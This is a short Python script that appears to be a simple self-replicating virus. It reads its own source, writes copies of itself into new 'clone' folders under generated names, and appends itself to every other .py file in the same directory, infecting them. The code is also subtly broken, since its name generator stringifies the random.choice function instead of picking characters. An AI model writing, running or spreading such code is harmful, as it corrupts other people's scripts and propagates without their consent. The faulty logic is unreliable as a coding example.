#!/usr/bin/env python3

import os
import random

File = open(__file__,'r')
Data = File.read()
File.close()
# Replicates the script to a folder
def Randomizer():

    name = ''
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    Length = random.randint(1,11)
    for i in range(Length):
        name += str(random.choice)
    return name

def Recreate(Fi_Name,Folder):
    try:
        os.mkdir(Folder)
        os.chdir(Folder)
        File = open(Fi_Name + '.py','w')
        File.write(Data)
        File.close()
        os.chdir("..")

    except Exception as Error:
        Folder = Folder + "0"
        Recreate(Fi_Name,Folder)

for i in range(5):
    Name = Randomizer()
    Recreate(Name,"clone")

Files = list()
for file in os.listdir():
    if file.endswith('.py'):
        Files.append(file)
Files.remove(__file__)

#Injects code into other .py scripts in the same folder
for File in Files:
    Object = open(File,'a')
    Object.write(Data)
    Object.close()



